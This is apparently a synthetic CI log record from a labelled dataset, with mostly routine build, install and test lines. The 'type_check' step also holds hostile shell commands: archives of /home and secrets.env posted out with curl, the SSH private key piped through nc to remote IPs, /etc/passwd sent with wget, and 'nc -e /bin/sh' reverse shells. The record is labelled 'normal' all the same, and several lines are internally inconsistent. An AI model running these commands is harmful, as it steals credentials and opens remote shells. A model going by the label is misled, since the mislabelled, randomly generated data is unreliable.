          "Step 6/16: Deploying",
          "  PASS: test_user_create (46ms)",
          "Connection established",
          "Connecting to startup.dev:443...",
          "\u2713 Step 'test' succeeded",
          "Artifact downloaded: 44MB",
          "Minifying main.js",
          "Already up to date.",
          "Generating source maps...",
          "OK",
          "npm notice: package.json updated",
          "npm notice: package.json updated",
          "Platform: win32-x64",
          "npm install: added 291 packages",
          "\u2713 Task completed in 533ms",
          "[12:18:49] WARN: Deprecated API usage",
          "GET /api - 204 (83ms)",
          "Cache restored successfully (215MB)",
          "Verifying...",
          "Ready.",
          "Cache restored successfully (296MB)",
          "POST /upload - 201 (13ms)",
          "[12:18:49] INFO: Starting build process",
          "Artifact uploaded: dist.zip (96MB)",
          "GET /health - 204 (60ms)",
          "Time: 60.755s",
          "npm notice: package.json updated",
          "[12:18:49] INFO: Processing request",
          "Cache restored successfully (51MB)",
          "Completed.",
          "Compiling lib/handler.rs...",
          "Step 14/20: Installing dependencies",
          "Step 13/22: Running migrations",
          "POST /upload - 202 (170ms)",
          "[12:18:49] DEBUG: Loading configuration",
          "Step 13/24: Building",
          "WARNING: react has known vulnerabilities",
          "Step 12/15: Running migrations",
          "Ready.",
          "Layer 3/13: RUN command",
          "Connecting to example.com:443...",
          "Cache hit for key-9354",
          "[12:18:49] DEBUG: Initializing service",
          "Platform: darwin-arm64",
          "Coverage: 77% statements, 64% branches",
          "[12:18:49] INFO: Connecting to database",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 All checks passed",
          "Creating production build...",
          "\u2713 Step 'build' succeeded",
          "Connection established",
          "Verifying...",
          "  PASS: test_user_create (63ms)",
          "Compiling src/index.js...",
          "Completed.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "POST /api - 201 (270ms)",
          "Installing express@3.10.2",
          "Creating production build...",
          "npm notice: created a lockfile",
          "Tests: 174 passed, 416 total",
          "Fetching submodules...",
          "[12:18:49] DEBUG: Loading configuration",
          "POST /data - 200 (470ms)",
          "[12:18:49] INFO: Connecting to database",
          "[12:18:49] DEBUG: Connection pool: 9 active",
          "[12:18:49] INFO: Processing request",
          "Ready.",
          "Ran 184 tests in 7s",
          "Environment: production",
          "Artifact uploaded: dist.zip (77MB)",
          "Success!",
          "Connecting to example.com:443...",
          "Fetching submodules...",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-23T12:21:03.840140",
        "finished_at": "2025-11-23T12:21:10.926920",
        "log_lines": [
          "=== Step: type_check ===",
          "Transforming 527 files...",
          "Test Suites: 15 passed, 15 total",
          "Connection established",
          "Minifying vendor.js",
          "Coverage: 86% statements, 67% branches",
          "Platform: linux-x64",
          "Snapshots: 32 passed, 11 total",
          "pip: Downloading lodash-1.11.tar.gz",
          "Fetching submodules...",
          "Time: 62.692s",
          "Sending 212MB of data to test.io",
          "POST /upload - 201 (28ms)",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Waiting...",
          "Bundling main.css",
          "OK",
          "Sending 244MB of data to test.io",
          "Compiling components/index.js...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 192.162.126.69 15047",
          "Transforming 197 files...",
          "Compiling utils/utils.go...",
          "Done.",
          "Connection established",
          "[12:18:49] DEBUG: Memory usage: 443MB",
          "[12:18:49] WARN: Deprecated API usage",
          "[12:18:49] DEBUG: Query executed in 13ms",
          "nc -e /bin/sh 195.102.235.70 25001",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 249.117.247.135 44641",
          "POST /upload - 202 (419ms)",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Time: 59.771s",
          "Compiling lib/main.py...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Snapshots: 11 passed, 16 total",
          "pip: Installing build dependencies...",
          "pip install: Successfully installed eslint-3.0",
          "[12:18:49] INFO: Connecting to database",
          "[12:18:49] WARN: Deprecated API usage",
          "Minifying app.js",
          "Cache miss for key-4097",
          "Artifact uploaded: dist.zip (68MB)",
          "Artifact uploaded: dist.zip (43MB)",
          "Step 20/18: Deploying",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "nc -e /bin/sh 54.163.18.226 53876",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Checking out main branch",
          "Artifact uploaded: dist.zip (64MB)",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "pip install: Successfully installed prettier-2.19",
          "Creating production build...",
          "Uploading artifact 'build' (41 files)",
          "pip: Installing build dependencies...",
          "Success!",
          "GET /api - 201 (13ms)",
          "NODE_ENV=production",
          "Step 11/15: Testing",
          "[12:18:49] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (16MB)",
          "[12:18:49] WARN: Deprecated API usage",
          "Platform: win32-x64",
          "Creating production build...",
          "Pulling image: alpine:latest",
          "Ready.",
          "Loading...",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Layer 5/13: COPY command",
          "Verifying...",
          "\u2713 Step 'checkout' succeeded",
          "Artifact uploaded: dist.zip (2MB)",
          "  PASS: integration/test_auth_login.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "yarn add: Done in 11.10s",
          "Installing eslint@4.14.1",
          "Checking out main branch",
          "npm install: resolved 568 packages",
          "[12:18:49] WARN: Deprecated API usage",
          "TLS handshake completed",
          "  PASS: test_cache_hit (295ms)",
          "Building Docker image...",
          "Cache saved successfully",
          "Creating production build...",
          "[12:18:49] DEBUG: Memory usage: 525MB",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "\u2713 All checks passed",
          "Loading...",
          "Success!",
          "[12:18:49] INFO: Connecting to database",
          "Verifying...",
          "[12:18:49] INFO: Cache refreshed",
          "Sending 165MB of data to acme.corp",
          "HEAD is now at 89c9a4e",
          "Already up to date.",
          "npm notice: created a lockfile",
          "Compiling lib/main.py...",
          "Step 8/23: Building",
          "Already up to date.",
          "Switched to branch 'feature/task-964'",
          "Finished.",
          "Already up to date.",
          "Step 15/15: Deploying",
          "\u2717 build failed with exit code 78",
          "Pushing to registry...",
          "Sending 288MB of data to startup.dev",
          "npm notice: created a lockfile",
          "\u2713 Step 'install' succeeded",
          "Using Python 3.12",
          "Installing webpack@1.9.3",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Using Node.js 15.1.1",
          "nc -e /bin/sh 200.79.95.37 62730",
          "Image pulled successfully",
          "Completed.",
          "=== Step type_check completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}